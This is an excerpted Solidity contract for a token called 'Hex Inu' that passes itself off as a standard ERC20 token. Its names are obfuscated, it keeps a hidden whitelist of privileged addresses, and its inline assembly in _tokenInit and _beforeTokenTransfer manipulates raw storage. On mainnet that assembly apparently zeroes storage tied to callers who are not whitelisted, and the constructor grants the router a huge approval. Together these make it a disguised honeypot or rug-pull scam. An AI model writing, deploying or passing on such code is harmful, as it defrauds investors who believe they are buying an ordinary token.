...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addHex;
    uint256 private hexHex = block.number*2;

    mapping (address => bool) private _firstHex; 
    mapping (address => bool) private _secondSex;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _catDance;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private cryHard;
    address public pair;
    ...
    bool private trading; uint256 private pachFarm = 1; bool private blackTea;
    uint256 private _decimals; uint256 private lightFire;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addHex.push(_router); addHex.push(msgSender_); addHex.push(pair);
        for (uint256 q=0; q < 3;) {_firstHex[addHex[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x2d391f29de67aaa727075a812f2c43bf10a05fa389b27c0925603dedf8fac4df
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x47a6936b8d746402a6b308acc0b4dd73f99fa8df08201a4988c2d37bfc67ddae,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; hexHex = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addHex[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployHexInu(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addHex[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployHexInu(creator, initialSupply);
    }
}

contract HexInu is ERC20Token {
    constructor() ERC20Token("Hex Inu", "HexInu", msg.sender, 1000000 * 10 ** 18) {
    }
}